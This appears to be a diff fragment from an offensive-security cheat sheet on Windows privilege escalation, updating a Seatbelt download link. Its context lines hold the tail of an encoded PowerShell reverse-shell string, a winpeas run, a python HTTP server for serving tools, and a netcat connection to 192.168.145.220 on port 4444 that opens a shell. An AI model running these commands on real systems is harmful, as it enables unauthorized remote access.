@@ -3387,9 +3387,8 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     .\winpeas.exe 
     ```
   - Seatbelt enumeration
-    Download https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+    Download [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe)  
     `python3 -m http.server 80`
-
     ```
     nc 192.168.145.220 4444
     powershell
